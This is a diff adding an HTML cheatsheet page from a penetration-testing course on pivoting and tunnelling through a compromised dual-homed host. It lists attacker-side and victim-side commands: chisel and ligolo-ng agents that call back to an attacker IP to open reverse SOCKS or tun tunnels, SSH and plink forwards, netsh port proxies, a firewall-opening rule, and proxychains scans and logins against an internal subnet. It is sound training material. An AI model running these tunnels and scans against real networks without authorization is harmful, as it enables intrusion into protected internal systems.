@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Reference · Pivoting &amp; Tunneling Cheatsheet</title>
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body>
+
+<nav class="crumbs">OSCP Course · <a href="./links.html">Links</a> · Reference · <strong>Pivoting</strong> · <a href="./glossary.html">Glossary</a> · <a href="./active-directory.html">Active Directory</a></nav>
+
+<span class="kicker">Reference · One foothold → the whole subnet</span>
+<h1>Pivoting &amp; Tunneling Cheatsheet</h1>
+<p class="lead">Tunnels for <a href="../lessons/0013-pivoting-and-tunneling.html">Lesson 13</a> — a single dual-homed host turns into a doorway to a network you couldn't otherwise reach. Reflex: <strong>get a SOCKS proxy or a tun route, then aim your tools at <code>172.16.5.x</code>.</strong> A SOCKS proxy carries <strong>TCP only</strong>, so scan through it with <code>nmap -sT -Pn</code>.</p>
+
+<pre><span class="c"># topology used throughout this sheet</span>
+<span class="o">attacker  10.10.14.5  ── can reach ──&gt;  pivot 10.10.10.5  (dual-homed, also 172.16.5.5)</span>
+<span class="o">                                        pivot ── can reach ──&gt;  target 172.16.5.10  (you can't... yet)</span></pre>
+
+<table>
+<thead><tr><th>What you have on the pivot</th><th>Reach for</th><th>You get</th></tr></thead>
+<tbody>
+<tr><td>SSH creds</td><td><code>ssh -D</code> / sshuttle</td><td>SOCKS / VPN-like route</td></tr>
+<tr><td>Just a shell (Linux/Win)</td><td>chisel / ligolo-ng</td><td>reverse SOCKS / tun</td></tr>
+<tr><td>Windows shell, one port</td><td>netsh / plink.exe</td><td>single port forward</td></tr>
+<tr><td>Linux shell, one port</td><td>socat</td><td>single port relay</td></tr>
+</tbody>
+</table>
+
+<h2>proxychains — push any TCP tool through a SOCKS proxy</h2>
+<pre><span class="c"># 1. point proxychains at your SOCKS proxy: edit /etc/proxychains4.conf</span>
+<span class="p">$</span> <span class="o">sudo nano /etc/proxychains4.conf</span>
+<span class="c">#   keep ONE chain mode (strict_chain is fine), then in [ProxyList]:</span>
+<span class="c">#   comment the default tor line and add your proxy port</span>
+<span class="o"># socks4  127.0.0.1 9050      </span><span class="c"># &lt;- comment this default out</span>
+<span class="o">socks5  127.0.0.1 1080       </span><span class="c"># your ssh -D / chisel / ssh -R SOCKS port</span>
+
+<span class="c"># 2. run any TCP tool through it (-q = quiet, hides per-connection noise)</span>
+<span class="p">$</span> <span class="o">proxychains -q nmap -sT -Pn -p 445,3389,5985 172.16.5.10</span>
+<span class="p">$</span> <span class="o">proxychains evil-winrm -i 172.16.5.10 -u admin -p pass</span>
+<span class="p">$</span> <span class="o">proxychains -q crackmapexec smb 172.16.5.0/24</span></pre>
+<p class="cite">A SOCKS proxy relays <strong>TCP connect</strong> only: use <code>-sT</code> and skip host discovery with <code>-Pn</code>. No ICMP, no UDP, no SYN scan. It is slow — scan just the ports you care about.</p>
+
+<div class="box warn">
+<span class="box-title">nmap over a proxy</span>
+Always <code>nmap -sT -Pn</code> through proxychains/SOCKS. SOCKS only relays full TCP connections, so SYN scans (<code>-sS</code>), UDP (<code>-sU</code>) and ping sweeps fail silently or hang. Keep the port list short — every probe round-trips through the pivot.
+</div>
+
+<h2>SSH tunnelling — when you have SSH creds on the pivot</h2>
+<pre><span class="c"># dynamic SOCKS on YOUR 127.0.0.1:1080 (then point proxychains at it)</span>
+<span class="p">$</span> <span class="o">ssh -D 1080 user@10.10.10.5</span>
+
+<span class="c"># local forward: your 127.0.0.1:8080  -&gt;  172.16.5.10:80 (via pivot)</span>
+<span class="p">$</span> <span class="o">ssh -L 8080:172.16.5.10:80 user@10.10.10.5</span>
+
+<span class="c"># remote (reverse) dynamic SOCKS: opens SOCKS on YOUR 127.0.0.1:1080</span>
+<span class="c"># run FROM the victim when it can reach you but you can't reach it (NAT/fw)</span>
+<span class="p">$</span> <span class="o">ssh -R 1080 user@10.10.14.5</span>          <span class="c"># victim -&gt; you</span>
+
+<span class="c"># proxy jump: hop through the pivot straight onto the internal host</span>
+<span class="p">$</span> <span class="o">ssh -J user@10.10.10.5 user@172.16.5.10</span>
+
+<span class="c"># useful flags: -fN = background w/ no shell;  -g = let others use the forward</span></pre>
+
+<h2>chisel — reverse SOCKS when you only have a shell (no SSH)</h2>
+<pre><span class="c"># transfer the matching chisel binary to the victim first (like linpeas)</span>
+<span class="c"># ATTACKER: server in reverse mode</span>
+<span class="p">$</span> <span class="o">./chisel server -p 8000 --reverse</span>
+
+<span class="c"># VICTIM (pivot): dial back and open a reverse SOCKS proxy</span>
+<span class="p">C:\&gt;</span> <span class="o">chisel.exe client 10.10.14.5:8000 R:socks</span>
+<span class="c">#   -&gt; SOCKS5 now listens on ATTACKER 127.0.0.1:1080  -&gt; use proxychains</span>
+
+<span class="c"># or forward a single port: ATTACKER:8080 -&gt; 172.16.5.10:80 (via victim)</span>
+<span class="p">C:\&gt;</span> <span class="o">chisel.exe client 10.10.14.5:8000 R:8080:172.16.5.10:80</span></pre>
+
+<h2>ligolo-ng — modern tun pivot, no proxychains</h2>
+<pre><span class="c"># ATTACKER: start the proxy/listener (default :11601)</span>
+<span class="p">$</span> <span class="o">./proxy -selfcert</span>
+
+<span class="c"># ATTACKER (one-time): create + bring up the ligolo tun interface, route subnet</span>
+<span class="p">$</span> <span class="o">sudo ip tuntap add user $(whoami) mode tun ligolo</span>
+<span class="p">$</span> <span class="o">sudo ip link set ligolo up</span>
+<span class="p">$</span> <span class="o">sudo ip route add 172.16.5.0/24 dev ligolo</span>
+
+<span class="c"># VICTIM (pivot): connect back to the proxy</span>
+<span class="p">$</span> <span class="o">./agent -connect 10.10.14.5:11601 -ignore-cert</span>
+
+<span class="c"># in the ligolo console: select the session, then start the tunnel</span>
+<span class="p">ligolo-ng&gt;</span> <span class="o">session</span>      <span class="c"># pick the agent</span>
+<span class="p">[Agent]&gt;</span> <span class="o">start</span>
+<span class="c"># now hit 172.16.5.x with ANY tool natively (nmap -sS works, no proxychains)</span>
+<span class="p">$</span> <span class="o">nmap -p- 172.16.5.10</span></pre>
+
+<h2>sshuttle — VPN-like pivot over SSH (Linux pivot)</h2>
+<pre><span class="c"># transparent: routes the subnet over an SSH session — no SOCKS, no proxychains</span>
+<span class="p">$</span> <span class="o">sshuttle -r user@10.10.10.5 172.16.5.0/24</span>
+<span class="p">$</span> <span class="o">sshuttle -r user@10.10.10.5 172.16.5.0/24 --ssh-cmd "ssh -i key.pem"</span>
+<span class="c"># needs python on the pivot; cleanest native-tool access to one subnet</span></pre>
+
+<h2>Windows-native &amp; misc relays</h2>
+<pre><span class="c"># plink.exe (PuTTY CLI) — reverse-forward an internal port back to you</span>
+<span class="p">C:\&gt;</span> <span class="o">plink.exe -ssh -l kali -pw pass -R 3389:172.16.5.10:3389 10.10.14.5</span>
+
+<span class="c"># netsh portproxy — pivot listens on :8080, forwards to internal :80</span>
+<span class="p">C:\&gt;</span> <span class="o">netsh interface portproxy add v4tov4 listenport=8080 connectaddress=172.16.5.10 connectport=80</span>
+<span class="p">C:\&gt;</span> <span class="o">netsh interface portproxy show all</span>                       <span class="c"># list rules</span>
+<span class="p">C:\&gt;</span> <span class="o">netsh interface portproxy delete v4tov4 listenport=8080</span>   <span class="c"># clean up after</span>
+<span class="c"># open the firewall for the listener if needed:</span>
+<span class="p">C:\&gt;</span> <span class="o">netsh advfirewall firewall add rule name=fwd dir=in action=allow protocol=TCP localport=8080</span>
+
+<span class="c"># socat relay (Linux pivot): listen on :8080, forward to internal :80</span>
+<span class="p">$</span> <span class="o">socat TCP-LISTEN:8080,fork TCP:172.16.5.10:80 &amp;</span></pre>
+
+<h2>Find the next network from the pivot</h2>
+<pre><span class="c"># which subnets can THIS host see? look for a 2nd NIC / a 172.16.5.x address</span>
+<span class="p">$</span> <span class="o">ip a</span>                 <span class="c"># Linux</span>
+<span class="p">C:\&gt;</span> <span class="o">ipconfig /all</span>      <span class="c"># Windows</span>
+<span class="c"># who has it talked to recently? live neighbours = real targets</span>
+<span class="p">$</span> <span class="o">arp -a</span>
+<span class="c"># routing table = which networks are reachable, and via which interface</span>
+<span class="p">$</span> <span class="o">ip route</span>            <span class="c"># Linux</span>
+<span class="p">C:\&gt;</span> <span class="o">route print</span>        <span class="c"># Windows</span>
+<span class="c"># bonus: ss -tunlp (Linux) / netstat -ano (Windows) for internal-only services</span></pre>
+
+<div class="box note">
+<span class="box-title">Double pivoting</span>
+A third subnet hides behind <code>172.16.5.10</code>? Chain another hop. With <strong>ligolo</strong>, drop a second agent on that host, bind it to a new tun interface, and <code>ip route add 10.0.0.0/24 dev ligolo2</code> for the next range. With <strong>SOCKS</strong> tools, stand up a second proxy on the second pivot and add a second <code>socks5</code> line in proxychains (<code>strict_chain</code> chains them in order). Keep a diagram — it is easy to lose track of which port reaches which subnet.
+</div>
+
+<footer>
+<span><a href="../lessons/0013-pivoting-and-tunneling.html">← Lesson 13: Pivoting &amp; Tunneling</a></span>
+<span><a href="./glossary.html">Glossary</a> · <a href="./active-directory.html">Active Directory</a></span>
+</footer>
+
+</body>
+</html>
